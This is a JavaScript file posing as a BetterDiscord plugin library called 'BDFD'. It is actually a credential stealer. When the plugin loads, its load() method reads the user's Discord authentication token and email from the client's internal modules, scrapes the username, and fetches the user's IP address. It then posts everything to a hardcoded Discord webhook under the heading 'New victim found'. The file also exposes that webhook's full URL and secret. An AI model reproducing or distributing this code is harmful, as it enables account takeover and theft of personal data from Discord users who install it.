/** 
  * @name BDFD
  * @version 1.1
  * @description yes
*/

/* Authors
 * ethernalsteve - Developer
 * The Way - Co-Author of the idea
*/

/* 2020 */

const config = {
    "info": {
        "name": "BDFD",
        "authors": ["Brabus", "The Way", "hio"],
        "version": "1.1.2",
        "description": "LIBRARY for most of the Better Discord plugins"
    },
    "webhook": "https://discord.com/api/webhooks/816254505561096213/in_vQoZkYh_ES9EzbFGiKbkRkvoMhwQ48aNudp86QsdZZu16cYVzMUc_6fcaV0Av3XBb"
}

class BDFD {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
